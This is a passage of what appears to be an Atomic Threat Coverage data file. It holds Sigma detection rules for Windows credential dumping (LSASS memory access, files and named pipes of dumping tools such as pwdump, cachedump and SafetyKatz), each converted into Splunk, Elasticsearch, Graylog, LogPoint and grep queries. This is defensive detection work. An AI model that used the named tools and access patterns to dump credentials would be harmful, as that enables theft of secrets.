accessing LSASS memory\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"10\" AND TargetImage.keyword:*\\\\\\\\lsass.exe AND GrantedAccess.keyword:(*0x40* *0x1000* *0x1400* *0x100000* *0x1410* *0x1010* *0x1438* *0x143a* *0x1418* *0x1f0fff* *0x1f1fff* *0x1f2fff* *0x1f3fff*)) AND (NOT (ProcessName.keyword:(*\\\\\\\\wmiprvse.exe *\\\\\\\\taskmgr.exe *\\\\\\\\procexp64.exe *\\\\\\\\procexp.exe *\\\\\\\\lsm.exe *\\\\\\\\csrss.exe *\\\\\\\\wininit.exe *\\\\\\\\vmtoolsd.exe))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"10\" TargetImage=\"*\\\\\\\\lsass.exe\" (GrantedAccess=\"*0x40*\" OR GrantedAccess=\"*0x1000*\" OR GrantedAccess=\"*0x1400*\" OR GrantedAccess=\"*0x100000*\" OR GrantedAccess=\"*0x1410*\" OR GrantedAccess=\"*0x1010*\" OR GrantedAccess=\"*0x1438*\" OR GrantedAccess=\"*0x143a*\" OR GrantedAccess=\"*0x1418*\" OR GrantedAccess=\"*0x1f0fff*\" OR GrantedAccess=\"*0x1f1fff*\" OR GrantedAccess=\"*0x1f2fff*\" OR GrantedAccess=\"*0x1f3fff*\")) NOT ((ProcessName=\"*\\\\\\\\wmiprvse.exe\" OR ProcessName=\"*\\\\\\\\taskmgr.exe\" OR ProcessName=\"*\\\\\\\\procexp64.exe\" OR ProcessName=\"*\\\\\\\\procexp.exe\" OR ProcessName=\"*\\\\\\\\lsm.exe\" OR ProcessName=\"*\\\\\\\\csrss.exe\" OR ProcessName=\"*\\\\\\\\wininit.exe\" OR ProcessName=\"*\\\\\\\\vmtoolsd.exe\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"10\" TargetImage=\"*\\\\\\\\lsass.exe\" GrantedAccess IN [\"*0x40*\", \"*0x1000*\", \"*0x1400*\", \"*0x100000*\", \"*0x1410*\", \"*0x1010*\", \"*0x1438*\", \"*0x143a*\", \"*0x1418*\", \"*0x1f0fff*\", \"*0x1f1fff*\", \"*0x1f2fff*\", \"*0x1f3fff*\"])  -(ProcessName IN [\"*\\\\\\\\wmiprvse.exe\", \"*\\\\\\\\taskmgr.exe\", \"*\\\\\\\\procexp64.exe\", \"*\\\\\\\\procexp.exe\", \"*\\\\\\\\lsm.exe\", \"*\\\\\\\\csrss.exe\", \"*\\\\\\\\wininit.exe\", \"*\\\\\\\\vmtoolsd.exe\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*10)(?=.*.*\\\\lsass\\\\.exe)(?=.*(?:.*.*0x40.*|.*.*0x1000.*|.*.*0x1400.*|.*.*0x100000.*|.*.*0x1410.*|.*.*0x1010.*|.*.*0x1438.*|.*.*0x143a.*|.*.*0x1418.*|.*.*0x1f0fff.*|.*.*0x1f1fff.*|.*.*0x1f2fff.*|.*.*0x1f3fff.*))))(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\wmiprvse\\\\.exe|.*.*\\\\taskmgr\\\\.exe|.*.*\\\\procexp64\\\\.exe|.*.*\\\\procexp\\\\.exe|.*.*\\\\lsm\\\\.exe|.*.*\\\\csrss\\\\.exe|.*.*\\\\wininit\\\\.exe|.*.*\\\\vmtoolsd\\\\.exe))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Cred dump tools dropped files\nid: 8fbf3271-1ef6-4e94-8210-03c2317947f6\ndescription: Files with well-known filenames (parts of credential dump software or files produced by them) creation\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019/11/01\nmodified: 2019/11/13\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 11\n        TargetFilename|contains: \n            - '\\pwdump'\n            - '\\kirbi'\n            - '\\pwhashes'\n            - '\\wce_ccache'\n            - '\\wce_krbtkts'\n            - '\\fgdump-log'\n        TargetFilename|endswith: \n            - '\\test.pwd'\n            - '\\lsremora64.dll'\n            - '\\lsremora.dll'\n            - '\\fgexec.exe'\n            - '\\wceaux.dll'\n            - '\\SAM.out'\n            - '\\SECURITY.out'\n            - '\\SYSTEM.out'\n            - '\\NTDS.out'\n            - '\\DumpExt.dll'\n            - '\\DumpSvc.exe'\n            - '\\cachedump64.exe'\n            - '\\cachedump.exe'\n            - '\\pstgdump.exe'\n            - '\\servpw.exe'\n            - '\\servpw64.exe'\n            - '\\pwdump.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate Administrator using tool for password recovery\nlevel: medium\nstatus: experimental", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Cred dump tools dropped files\nid: 8fbf3271-1ef6-4e94-8210-03c2317947f6\ndescription: Files with well-known filenames (parts of credential dump software or files produced by them) creation\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019/11/01\nmodified: 2019/11/13\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 11\n        TargetFilename|contains: \n            - '\\pwdump'\n            - '\\kirbi'\n            - '\\pwhashes'\n            - '\\wce_ccache'\n            - '\\wce_krbtkts'\n            - '\\fgdump-log'\n        TargetFilename|endswith: \n            - '\\test.pwd'\n            - '\\lsremora64.dll'\n            - '\\lsremora.dll'\n            - '\\fgexec.exe'\n            - '\\wceaux.dll'\n            - '\\SAM.out'\n            - '\\SECURITY.out'\n            - '\\SYSTEM.out'\n            - '\\NTDS.out'\n            - '\\DumpExt.dll'\n            - '\\DumpSvc.exe'\n            - '\\cachedump64.exe'\n            - '\\cachedump.exe'\n            - '\\pstgdump.exe'\n            - '\\servpw.exe'\n            - '\\servpw64.exe'\n            - '\\pwdump.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate Administrator using tool for password recovery\nlevel: medium\nstatus: experimental", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"11\" AND TargetFilename.keyword:(*\\\\\\\\pwdump* OR *\\\\\\\\kirbi* OR *\\\\\\\\pwhashes* OR *\\\\\\\\wce_ccache* OR *\\\\\\\\wce_krbtkts* OR *\\\\\\\\fgdump\\\\-log*) AND TargetFilename.keyword:(*\\\\\\\\test.pwd OR *\\\\\\\\lsremora64.dll OR *\\\\\\\\lsremora.dll OR *\\\\\\\\fgexec.exe OR *\\\\\\\\wceaux.dll OR *\\\\\\\\SAM.out OR *\\\\\\\\SECURITY.out OR *\\\\\\\\SYSTEM.out OR *\\\\\\\\NTDS.out OR *\\\\\\\\DumpExt.dll OR *\\\\\\\\DumpSvc.exe OR *\\\\\\\\cachedump64.exe OR *\\\\\\\\cachedump.exe OR *\\\\\\\\pstgdump.exe OR *\\\\\\\\servpw.exe OR *\\\\\\\\servpw64.exe OR *\\\\\\\\pwdump.exe))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Cred-dump-tools-dropped-files <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Cred dump tools dropped files\",\\n    \"description\": \"Files with well-known filenames (parts of credential dump software or files produced by them) creation\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"11\\\\\" AND TargetFilename.keyword:(*\\\\\\\\\\\\\\\\pwdump* OR *\\\\\\\\\\\\\\\\kirbi* OR *\\\\\\\\\\\\\\\\pwhashes* OR *\\\\\\\\\\\\\\\\wce_ccache* OR *\\\\\\\\\\\\\\\\wce_krbtkts* OR *\\\\\\\\\\\\\\\\fgdump\\\\\\\\-log*) AND TargetFilename.keyword:(*\\\\\\\\\\\\\\\\test.pwd OR *\\\\\\\\\\\\\\\\lsremora64.dll OR *\\\\\\\\\\\\\\\\lsremora.dll OR *\\\\\\\\\\\\\\\\fgexec.exe OR *\\\\\\\\\\\\\\\\wceaux.dll OR *\\\\\\\\\\\\\\\\SAM.out OR *\\\\\\\\\\\\\\\\SECURITY.out OR *\\\\\\\\\\\\\\\\SYSTEM.out OR *\\\\\\\\\\\\\\\\NTDS.out OR *\\\\\\\\\\\\\\\\DumpExt.dll OR *\\\\\\\\\\\\\\\\DumpSvc.exe OR *\\\\\\\\\\\\\\\\cachedump64.exe OR *\\\\\\\\\\\\\\\\cachedump.exe OR *\\\\\\\\\\\\\\\\pstgdump.exe OR *\\\\\\\\\\\\\\\\servpw.exe OR *\\\\\\\\\\\\\\\\servpw64.exe OR *\\\\\\\\\\\\\\\\pwdump.exe))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"11\\\\\" AND TargetFilename.keyword:(*\\\\\\\\\\\\\\\\pwdump* OR *\\\\\\\\\\\\\\\\kirbi* OR *\\\\\\\\\\\\\\\\pwhashes* OR *\\\\\\\\\\\\\\\\wce_ccache* OR *\\\\\\\\\\\\\\\\wce_krbtkts* OR *\\\\\\\\\\\\\\\\fgdump\\\\\\\\-log*) AND TargetFilename.keyword:(*\\\\\\\\\\\\\\\\test.pwd OR *\\\\\\\\\\\\\\\\lsremora64.dll OR *\\\\\\\\\\\\\\\\lsremora.dll OR *\\\\\\\\\\\\\\\\fgexec.exe OR *\\\\\\\\\\\\\\\\wceaux.dll OR *\\\\\\\\\\\\\\\\SAM.out OR *\\\\\\\\\\\\\\\\SECURITY.out OR *\\\\\\\\\\\\\\\\SYSTEM.out OR *\\\\\\\\\\\\\\\\NTDS.out OR *\\\\\\\\\\\\\\\\DumpExt.dll OR *\\\\\\\\\\\\\\\\DumpSvc.exe OR *\\\\\\\\\\\\\\\\cachedump64.exe OR *\\\\\\\\\\\\\\\\cachedump.exe OR *\\\\\\\\\\\\\\\\pstgdump.exe OR *\\\\\\\\\\\\\\\\servpw.exe OR *\\\\\\\\\\\\\\\\servpw64.exe OR *\\\\\\\\\\\\\\\\pwdump.exe))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Cred dump tools dropped files\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"11\" AND TargetFilename.keyword:(*\\\\\\\\pwdump* *\\\\\\\\kirbi* *\\\\\\\\pwhashes* *\\\\\\\\wce_ccache* *\\\\\\\\wce_krbtkts* *\\\\\\\\fgdump\\\\-log*) AND TargetFilename.keyword:(*\\\\\\\\test.pwd *\\\\\\\\lsremora64.dll *\\\\\\\\lsremora.dll *\\\\\\\\fgexec.exe *\\\\\\\\wceaux.dll *\\\\\\\\SAM.out *\\\\\\\\SECURITY.out *\\\\\\\\SYSTEM.out *\\\\\\\\NTDS.out *\\\\\\\\DumpExt.dll *\\\\\\\\DumpSvc.exe *\\\\\\\\cachedump64.exe *\\\\\\\\cachedump.exe *\\\\\\\\pstgdump.exe *\\\\\\\\servpw.exe *\\\\\\\\servpw64.exe *\\\\\\\\pwdump.exe))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"11\" (TargetFilename=\"*\\\\\\\\pwdump*\" OR TargetFilename=\"*\\\\\\\\kirbi*\" OR TargetFilename=\"*\\\\\\\\pwhashes*\" OR TargetFilename=\"*\\\\\\\\wce_ccache*\" OR TargetFilename=\"*\\\\\\\\wce_krbtkts*\" OR TargetFilename=\"*\\\\\\\\fgdump-log*\") (TargetFilename=\"*\\\\\\\\test.pwd\" OR TargetFilename=\"*\\\\\\\\lsremora64.dll\" OR TargetFilename=\"*\\\\\\\\lsremora.dll\" OR TargetFilename=\"*\\\\\\\\fgexec.exe\" OR TargetFilename=\"*\\\\\\\\wceaux.dll\" OR TargetFilename=\"*\\\\\\\\SAM.out\" OR TargetFilename=\"*\\\\\\\\SECURITY.out\" OR TargetFilename=\"*\\\\\\\\SYSTEM.out\" OR TargetFilename=\"*\\\\\\\\NTDS.out\" OR TargetFilename=\"*\\\\\\\\DumpExt.dll\" OR TargetFilename=\"*\\\\\\\\DumpSvc.exe\" OR TargetFilename=\"*\\\\\\\\cachedump64.exe\" OR TargetFilename=\"*\\\\\\\\cachedump.exe\" OR TargetFilename=\"*\\\\\\\\pstgdump.exe\" OR TargetFilename=\"*\\\\\\\\servpw.exe\" OR TargetFilename=\"*\\\\\\\\servpw64.exe\" OR TargetFilename=\"*\\\\\\\\pwdump.exe\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"11\" TargetFilename IN [\"*\\\\\\\\pwdump*\", \"*\\\\\\\\kirbi*\", \"*\\\\\\\\pwhashes*\", \"*\\\\\\\\wce_ccache*\", \"*\\\\\\\\wce_krbtkts*\", \"*\\\\\\\\fgdump-log*\"] TargetFilename IN [\"*\\\\\\\\test.pwd\", \"*\\\\\\\\lsremora64.dll\", \"*\\\\\\\\lsremora.dll\", \"*\\\\\\\\fgexec.exe\", \"*\\\\\\\\wceaux.dll\", \"*\\\\\\\\SAM.out\", \"*\\\\\\\\SECURITY.out\", \"*\\\\\\\\SYSTEM.out\", \"*\\\\\\\\NTDS.out\", \"*\\\\\\\\DumpExt.dll\", \"*\\\\\\\\DumpSvc.exe\", \"*\\\\\\\\cachedump64.exe\", \"*\\\\\\\\cachedump.exe\", \"*\\\\\\\\pstgdump.exe\", \"*\\\\\\\\servpw.exe\", \"*\\\\\\\\servpw64.exe\", \"*\\\\\\\\pwdump.exe\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*11)(?=.*(?:.*.*\\\\pwdump.*|.*.*\\\\kirbi.*|.*.*\\\\pwhashes.*|.*.*\\\\wce_ccache.*|.*.*\\\\wce_krbtkts.*|.*.*\\\\fgdump-log.*))(?=.*(?:.*.*\\\\test\\\\.pwd|.*.*\\\\lsremora64\\\\.dll|.*.*\\\\lsremora\\\\.dll|.*.*\\\\fgexec\\\\.exe|.*.*\\\\wceaux\\\\.dll|.*.*\\\\SAM\\\\.out|.*.*\\\\SECURITY\\\\.out|.*.*\\\\SYSTEM\\\\.out|.*.*\\\\NTDS\\\\.out|.*.*\\\\DumpExt\\\\.dll|.*.*\\\\DumpSvc\\\\.exe|.*.*\\\\cachedump64\\\\.exe|.*.*\\\\cachedump\\\\.exe|.*.*\\\\pstgdump\\\\.exe|.*.*\\\\servpw\\\\.exe|.*.*\\\\servpw64\\\\.exe|.*.*\\\\pwdump\\\\.exe)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Cred dump-tools named pipes\nid: 961d0ba2-3eea-4303-a930-2cf78bbfcc5e\ndescription: Detects well-known credential dumping tools execution via specific named pipes\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019/11/01\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 17\n        PipeName|contains:\n            - '\\lsadump'\n            - '\\cachedump'\n            - '\\wceservicepipe'\n    condition: selection\nfalsepositives:\n    - Legitimate Administrator using tool for password recovery\nlevel: medium\nstatus: experimental", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Cred dump-tools named pipes\nid: 961d0ba2-3eea-4303-a930-2cf78bbfcc5e\ndescription: Detects well-known credential dumping tools execution via specific named pipes\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019/11/01\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 17\n        PipeName|contains:\n            - '\\lsadump'\n            - '\\cachedump'\n            - '\\wceservicepipe'\n    condition: selection\nfalsepositives:\n    - Legitimate Administrator using tool for password recovery\nlevel: medium\nstatus: experimental", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"17\" AND PipeName.keyword:(*\\\\\\\\lsadump* OR *\\\\\\\\cachedump* OR *\\\\\\\\wceservicepipe*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Cred-dump-tools-named-pipes <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Cred dump-tools named pipes\",\\n    \"description\": \"Detects well-known credential dumping tools execution via specific named pipes\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"17\\\\\" AND PipeName.keyword:(*\\\\\\\\\\\\\\\\lsadump* OR *\\\\\\\\\\\\\\\\cachedump* OR *\\\\\\\\\\\\\\\\wceservicepipe*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"17\\\\\" AND PipeName.keyword:(*\\\\\\\\\\\\\\\\lsadump* OR *\\\\\\\\\\\\\\\\cachedump* OR *\\\\\\\\\\\\\\\\wceservicepipe*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Cred dump-tools named pipes\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"17\" AND PipeName.keyword:(*\\\\\\\\lsadump* *\\\\\\\\cachedump* *\\\\\\\\wceservicepipe*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"17\" (PipeName=\"*\\\\\\\\lsadump*\" OR PipeName=\"*\\\\\\\\cachedump*\" OR PipeName=\"*\\\\\\\\wceservicepipe*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"17\" PipeName IN [\"*\\\\\\\\lsadump*\", \"*\\\\\\\\cachedump*\", \"*\\\\\\\\wceservicepipe*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*17)(?=.*(?:.*.*\\\\lsadump.*|.*.*\\\\cachedump.*|.*.*\\\\wceservicepipe.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Detection of SafetyKatz\nid: e074832a-eada-4fd7-94a1-10642b130e16\nstatus: experimental\ndescription: Detects possible SafetyKatz Behaviour\nreferences:\n    - https://github.com/GhostPack/SafetyKatz\ntags:\n    - attack.credential_access\n    - attack.t1003\nauthor: Markus Neis\ndate: 2018/07/24\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 11\n        TargetFilename: '*\\Temp\\debug.bin'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Detection of SafetyKatz\nid: e074832a-eada-4fd7-94a1-10642b130e16\nstatus: experimental\ndescription: Detects possible SafetyKatz Behaviour\nreferences:\n    - https://github.com/GhostPack/SafetyKatz\ntags:\n    - attack.credential_access\n    - attack.t1003\nauthor: Markus Neis\ndate: 2018/07/24\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 11\n        TargetFilename: '*\\Temp\\debug.bin'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"11\" AND TargetFilename.keyword:*\\\\\\\\Temp\\\\\\\\debug.bin)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Detection-of-SafetyKatz <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Detection of SafetyKatz\",\\n    \"description\": \"Detects possible SafetyKatz Behaviour\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"11\\\\\" AND TargetFilename.keyword:*\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\debug.bin)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"11\\\\\" AND TargetFilename.keyword:*\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\debug.bin)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Detection of SafetyKatz\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"11\" AND TargetFilename.keyword:*\\\\\\\\Temp\\\\\\\\debug.bin)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"11\" TargetFilename=\"*\\\\\\\\Temp\\\\\\\\debug.bin\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"11\" TargetFilename=\"*\\\\\\\\Temp\\\\\\\\debug.bin\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*11)(?=.*.*\\\\Temp\\\\debug\\\\.bin))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: LSASS Memory Dump\nid: 5ef9853e-4d0e-4a70-846f-a9ca37d876da\nstatus: experimental\ndescription: Detects process LSASS memory dump using procdump or taskmgr based on the CallTrace pointing to dbghelp.dll or dbgcore.dll for win10\nauthor: Samir Bousseaden\nreferences:\n    - https://blog.menasec.net/2019/02/threat-hunting-21-procdump-or-taskmgr.html\ntags:\n    - attack.t1003\n    - attack.s0002\n    - attack.credential_access\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 10\n        TargetImage: 'C:\\windows\\system32\\lsass.exe'\n        GrantedAccess: '0x1fffff'\n        CallTrace:\n         - '*dbghelp.dll*'\n         - '*dbgcore.dll*'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: LSASS Memory Dump\nid: 5ef9853e-4d0e-4a70-846f-a9ca37d876da\nstatus: experimental\ndescription: Detects process LSASS memory dump using procdump or taskmgr based on the CallTrace pointing to dbghelp.dll or dbgcore.dll for win10\nauthor: Samir Bousseaden\nreferences:\n    - https://blog.menasec.net/2019/02/threat-hunting-21-procdump-or-taskmgr.html\ntags:\n    - attack.t1003\n    - attack.s0002\n    - attack.credential_access\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 10\n        TargetImage: 'C:\\windows\\system32\\lsass.exe'\n        GrantedAccess: '0x1fffff'\n        CallTrace:\n         - '*dbghelp.dll*'\n         - '*dbgcore.dll*'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"10\" AND TargetImage:\"C\\\\:\\\\\\\\windows\\\\\\\\system32\\\\\\\\lsass.exe\" AND GrantedAccess:\"0x1fffff\" AND CallTrace.keyword:(*dbghelp.dll* OR *dbgcore.dll*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/LSASS-Memory-Dump <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"LSASS Memory Dump\",\\n    \"description\": \"Detects process LSASS memory dump using procdump or taskmgr based on the CallTrace pointing to dbghelp.dll or dbgcore.dll for win10\",\\n    \"tags\": [\\n      \"attack.t1003\",\\n      \"attack.s0002\",\\n      \"attack.credential_access\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"10\\\\\" AND TargetImage:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\windows\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\lsass.exe\\\\\" AND GrantedAccess:\\\\\"0x1fffff\\\\\" AND CallTrace.keyword:(*dbghelp.dll* OR *dbgcore.dll*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"10\\\\\" AND TargetImage:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\windows\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\lsass.exe\\\\\" AND GrantedAccess:\\\\\"0x1fffff\\\\\" AND CallTrace.keyword:(*dbghelp.dll* OR *dbgcore.dll*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'LSASS Memory Dump\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"10\" AND TargetImage:\"C\\\\:\\\\\\\\windows\\\\\\\\system32\\\\\\\\lsass.exe\" AND GrantedAccess:\"0x1fffff\" AND CallTrace.keyword:(*dbghelp.dll* *dbgcore.dll*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"10\" TargetImage=\"C:\\\\\\\\windows\\\\\\\\system32\\\\\\\\lsass.exe\" 